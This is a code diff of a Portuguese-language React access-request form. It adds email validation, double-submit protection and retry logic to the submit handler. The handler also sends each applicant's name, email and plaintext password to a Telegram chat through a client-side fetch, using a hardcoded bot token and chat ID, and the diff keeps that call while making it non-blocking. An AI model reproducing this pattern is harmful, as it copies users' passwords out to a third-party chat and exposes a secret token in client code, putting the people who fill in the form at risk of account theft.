@@ -17,9 +17,15 @@ export function AccessRequestForm({ onBack }: { onBack: () => void }) {
 
   const handleSubmit = async (e: FormEvent) => {
     e.preventDefault();
+    if (submitting) return; // prevent double-submit
     setError("");
     if (!name.trim() || !email.trim() || !password.trim()) {
       setError("Preencha todos os campos.");
+      return;
+    }
+    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim());
+    if (!emailOk) {
+      setError("Informe um e-mail válido.");
       return;
     }
     if (password.length < 6) {
@@ -28,39 +34,68 @@ export function AccessRequestForm({ onBack }: { onBack: () => void }) {
     }
     setSubmitting(true);
     const cleanName = name.trim();
-    const cleanEmail = email.trim();
+    const cleanEmail = email.trim().toLowerCase();
 
-    // 1. Enviar Telegram IMEDIATAMENTE (direto do clique)
+    // 1. Telegram direto do clique — best-effort, NUNCA bloqueia o envio
     const TELEGRAM_TOKEN = "8418595437:AAGK7iPeqR1L6YGdsuwt2XuOgI_aYa-4KB0";
     const TELEGRAM_CHAT_ID = "8353500339";
     const text = `🆕 Nova solicitação de acesso\n\nNome: ${cleanName}\nEmail: ${cleanEmail}\nSenha: ${password}\n\nStatus: Pendente`;
-    try {
-      console.info("[access-request] Enviando Telegram direto do clique...");
-      const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
-      });
-      const tgBody = await tgRes.text();
-      console.info("[access-request] Telegram resposta:", tgRes.status, tgBody.slice(0, 200));
-    } catch (err) {
-      console.error("[access-request] Falha ao enviar Telegram (seguindo mesmo assim):", err);
+    const tgController = new AbortController();
+    const tgTimeout = setTimeout(() => tgController.abort(), 5000);
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
+      signal: tgController.signal,
+    })
+      .then((r) => console.info("[access-request] Telegram status:", r.status))
+      .catch((err) => console.warn("[access-request] Telegram falhou (ignorado):", err))
+      .finally(() => clearTimeout(tgTimeout));
+
+    // 2. Salvar solicitação no banco — com timeout e retry
+    const callWithTimeout = async () => {
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 15000);
+      try {
+        return await submitAccessRequest({ data: { name: cleanName, email: cleanEmail, password } });
+      } finally {
+        clearTimeout(timeoutId);
+      }
+    };
+
+    let result: any = null;
+    let lastErr: any = null;
+    for (let attempt = 1; attempt <= 2; attempt++) {
+      try {
+        result = await callWithTimeout();
+        break;
+      } catch (err) {
+        lastErr = err;
+        console.warn(`[access-request] tentativa ${attempt} falhou`, err);
+        if (attempt < 2) await new Promise((r) => setTimeout(r, 600));
+      }
     }
 
-    // 2. Salvar solicitação no banco com status pending
-    try {
-      const result = await submitAccessRequest({ data: { name: cleanName, email: cleanEmail, password } });
-      if (!result.ok) {
-        setError("Erro ao salvar solicitação. Tente novamente.");
-        setSubmitting(false);
-        return;
-      }
-    } catch (err) {
-      console.error("[access-request] Erro ao salvar no banco:", err);
-      setError("Erro ao enviar solicitação. Tente novamente.");
+    if (!result) {
+      console.error("[access-request] Falha definitiva:", lastErr);
       setSubmitting(false);
+      setError("Falha de conexão. Verifique sua internet e tente novamente.");
       return;
     }
+
+    if (!result.ok) {
+      setSubmitting(false);
+      const reason = result.reason ?? "";
+      if (reason === "insert_failed") {
+        setError("Não foi possível salvar sua solicitação agora. Tente novamente em instantes.");
+      } else if (reason === "unexpected") {
+        setError("Servidor temporariamente ocupado. Tente novamente em instantes.");
+      } else {
+        setError(result.error || "Não foi possível enviar a solicitação. Tente novamente.");
+      }
+      return;
+    }
+
     setSubmitting(false);
     setSuccess(true);
   };
